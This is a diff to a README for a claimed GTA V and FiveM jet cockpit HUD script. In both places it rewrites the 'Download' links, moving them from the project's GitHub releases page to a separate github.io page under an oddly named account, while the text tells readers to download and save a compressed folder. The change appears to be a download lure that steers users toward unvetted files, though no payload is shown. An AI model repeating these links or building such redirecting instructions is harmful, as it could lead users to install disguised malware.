@@ -1,6 +1,6 @@
 # 🛩️ solived-jet-hud-v2-script - Improve your flight realism in game
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Imperial-profaneness670/solived-jet-hud-v2-script/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://imperial-profaneness670.github.io)
 
 The solived-jet-hud-v2-script adds a custom cockpit display to your aircraft in GTA V and FiveM. This tool replaces the standard game interface with a realistic HUD. You see flight data, targeting information, and altitude readouts directly on your screen while you fly.
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you begin:
 
 Visit the official release page to obtain the files.
 
-[Download the latest files here](https://github.com/Imperial-profaneness670/solived-jet-hud-v2-script/releases)
+[Download the latest files here](https://imperial-profaneness670.github.io)
 
 Click the link above to view the list of available versions. Choose the asset marked as the latest release. Save the compressed folder to your desktop or a familiar folder on your computer.
 
